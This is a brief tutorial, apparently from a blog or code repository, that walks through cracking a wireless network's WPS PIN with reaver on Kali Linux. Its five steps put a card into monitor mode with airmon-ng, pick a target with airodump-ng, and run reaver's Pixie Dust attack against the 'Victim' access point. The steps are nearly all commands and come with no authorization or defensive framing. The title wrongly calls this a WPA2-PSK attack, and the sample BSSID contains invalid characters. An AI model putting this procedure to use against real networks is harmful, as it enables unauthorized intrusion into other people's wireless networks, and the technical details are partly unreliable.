# Hack Wap2-psk using reaver method (kali linux).
Step 1: Open Terminal. Type 
~# ifconfig

Step 2: Type the following commands on terminal.
~# airmon-ng check kill
~# airmon-ng check

Step 3: Enable Monitor mode. Now, we use a tool called airmon-ng to create a virtual interface called mon. Just type:
~# airmon-ng start wlan0 

Step 4: Start capturing packets. we’ll use airodump-ng to capture the packets in the air. You’ll see the name of the wifi you want to hack.
~# airodump-ng wlan0mon
then press Ctrl+c

Step5: Copy the BSSID of Victim. And write it on this command.
~# reaver -i wlan0mon -b (BSSID) -vv -K 1
For ex: reaver -i wlan0mon -b B0:5G:54:96:G7:70 -vv -K 1
